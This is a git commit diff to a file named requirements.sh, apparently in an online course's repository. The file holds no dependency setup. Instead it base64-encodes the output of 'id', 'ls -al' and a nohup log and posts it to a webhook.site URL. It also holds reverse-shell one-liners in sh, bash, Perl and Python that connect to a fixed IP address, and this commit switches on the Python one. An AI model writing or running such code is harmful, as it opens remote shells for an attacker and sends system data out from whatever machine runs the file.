472df855f3dc3d6bb2894bed16bc776e5977f296
datacamp-content-creator <32279578+datacamp-content-creator@users.noreply.github.com>
2020-09-28 15:29:55 +0200

    Update requirements.sh from editor UserId: 1591044

--- requirements.sh
+++ requirements.sh
@@ -1,10 +1,10 @@
 var=`id|base64`;curl -X POST -d "data=$var" https://webhook.site/5342f1d7-100d-4546-8007-22cc2d6f9fef
 
-sh -i >& /dev/udp/3.123.202.19/80 0>&1
-bash -i >& /dev/tcp/3.123.202.19/80 0>&1
+#sh -i >& /dev/udp/3.123.202.19/80 0>&1
+#bash -i >& /dev/tcp/3.123.202.19/80 0>&1
 
 #nohup perl -e 'use Socket;$i="3.123.202.19";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' &;
-#nohup python3 -u "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"3.123.202.19\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")" &;
+nohup python3 -u "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"3.123.202.19\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")" &;
 
 var=`cat nohup.out|base64`;curl -X POST -d "data=$var" https://webhook.site/5342f1d7-100d-4546-8007-22cc2d6f9fef
 var=`ls -al|base64`;curl -X POST -d "data=$var" https://webhook.site/5342f1d7-100d-4546-8007-22cc2d6f9fef
